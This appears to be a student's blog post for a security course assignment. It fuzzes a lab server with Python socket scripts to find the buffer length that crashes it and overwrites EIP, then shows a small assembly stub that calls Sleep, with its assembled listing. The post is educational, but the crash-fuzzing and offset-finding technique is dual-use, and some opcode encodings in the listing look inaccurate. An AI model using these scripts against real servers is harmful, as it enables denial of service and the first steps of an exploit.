---
layout: post
title:  "Vulnerability Discovery"
date:   2016-09-12  
comments:   true  
---

# Assignment 1, Vulnerability Discovery

Kaidi He		G31860481

### Part 1 of 2

First, to crash the server I did some modification on the codes provided by Prof.

```Python
import sys, socket, time
 
host = sys.argv[1]
port = int(sys.argv[2])
 
length = 100
 
while (length < 1000):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data1 = s.recv(1024)
	s.sendall("A" * length)
	data2 = s.recv(1024)
	s.close()
	time.sleep(2)
	print 'Recieved: ', repr(data1), repr(data2)
	length += 100
```

It turned out like this:

![](http://ww3.sinaimg.cn/large/801b780agw1f8nrsjsdx4j21kw0zktnz.jpg)

Thus, I knew that it crashed when input size was 500Bytes. Which means the least number of characters needed to cause the program to crash is less than 500 and more then 400. So I make the add-up pace slower to catch the exact number.

```Python
import sys, socket, time
 
host = sys.argv[1]
port = int(sys.argv[2])
 
length = 400
 
while (length < 1000):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data1 = s.recv(1024)
	s.sendall("A" * length)
	data2 = s.recv(1024)
	s.close()
	time.sleep(2)
	print 'Recieved: ', repr(data1), repr(data2)
	length += 1
```

And it turned out like this: 

![](http://ww3.sinaimg.cn/large/801b780agw1f8nrssaohfj21kw0zk7s7.jpg)

In this screenshot, we can see that when input size reach to **408 Bytes**(1.2) the server did crash but the EIP hasn't been entirly overwritten by the input. We need to keep adding the input length to find out the the least number of characters needed to overwrite all of EIP. After several experiments the least number of characters needed to overwrite all of EIP is **416**(1.2). (Becasue there is 4 Bytes EBP before 4 Bytes EIP).

After that, I modified the code again:

```Python
import sys, socket, time
 
host = sys.argv[1]
port = int(sys.argv[2])
 
length = 408
 
while (length < 1000):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	data1 = s.recv(1024)
	s.sendall("A" * length + "B" * 8)	# Using "B" to show EIP length
	data2 = s.recv(1024)
	s.close()
	time.sleep(2)
	print 'Recieved: ', repr(data1), repr(data2)
	length += 100
```

The result was:

![](http://ww2.sinaimg.cn/large/801b780agw1f8nrt16v02j21kw0zk7fw.jpg)

  Thus, we can see that the input begins at `0012F908`(1.3).

  ![](http://ww3.sinaimg.cn/large/801b780agw1f8nru8q7pvj20wi06kdht.jpg)

 And the EIP stack address is `0012FAA4`(1.4)

![](http://ww4.sinaimg.cn/large/801b780agw1f8nruo2nagj20r8026glr.jpg)

To avoid this problem, programmers just need to implement a constriction of the length of user input.

---

### Part 2 of 2

#### 2.1 

**System Version**:

- Windows 7 Professional
- Service Pack 1
- English
- 32-bit Operating System


![](http://ww3.sinaimg.cn/large/801b780agw1f8nrtq5o6jj21dc0p4147.jpg)


#### 2.2

```assembly
mov ebx, 0x75eeba46	;the address of the Sleep function in kernel32.dll
mov eax, 0
mov ax, 4000
push eax
call ebx
```

#### 2.3

listing:

```
     1 00000000 66BB46BAEE75            mov ebx, 0x75eeba46
     2 00000006 66B800000000            mov eax, 0
     3 0000000C B8A00F                  mov ax, 4000
     4 0000000F 6650                    push eax
     5 00000011 66FFD3                  call ebx
```

![](http://ww2.sinaimg.cn/large/801b780agw1f8nrtzpau1j21kw0zkds8.jpg)


### Reference:

> http://netsec.ws/?p=180